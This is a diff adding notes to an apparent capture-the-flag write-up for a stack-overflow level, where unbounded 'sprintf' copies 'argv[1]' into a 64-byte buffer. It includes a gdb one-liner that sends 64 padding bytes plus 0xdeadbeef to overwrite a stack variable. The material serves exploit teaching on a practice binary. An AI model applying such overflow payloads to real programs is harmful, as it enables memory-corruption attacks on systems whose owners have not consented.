@@ -26,3 +26,17 @@ Print `you have hit the target correctly :)`.
 
 ## Why it works
 `sprintf` copies `argv[1]` into a 64-byte buffer with no limit. The 64 bytes reach `target` at `[ebp-0xc]`; the next 4 bytes overwrite it with `0xdeadbeef`.
+
+## Extra notes
+- Input is `argv[1]`; `sprintf` copies it into a 64-byte stack buffer.
+- The vulnerable call is `sprintf(buffer, argv[1])`; extra format specifiers in the argument are not required for this level.
+- `target` is at `[ebp-0xc]`, 64 bytes after `[ebp-0x4c]`, so 64 bytes of padding reach it.
+- Debug:
+```bash
+gdb -q ./bin <<'GDB_EOF'
+b *0x08048413
+run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
+x/4xw $ebp-0xc
+GDB_EOF
+```
+- Expected success message: `you have hit the target correctly :)`.
